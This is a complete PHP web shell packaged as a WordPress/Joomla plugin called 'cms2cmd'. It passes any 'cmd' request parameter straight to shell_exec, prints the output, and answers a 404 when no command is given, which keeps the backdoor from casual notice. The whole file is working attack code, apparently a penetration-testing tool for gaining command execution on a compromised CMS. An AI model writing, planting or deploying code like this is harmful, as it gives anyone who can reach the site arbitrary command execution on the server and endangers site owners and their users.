<?php
    /*
    * Plugin Name: cms2cmd
    * Description: Very simple command execution plugin.
    * Version: 1.0
    * Author: @airman604
    * */

    // This file is used by Joomla and Wordpress

    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    } else {
        http_response_code(404);
    }
?>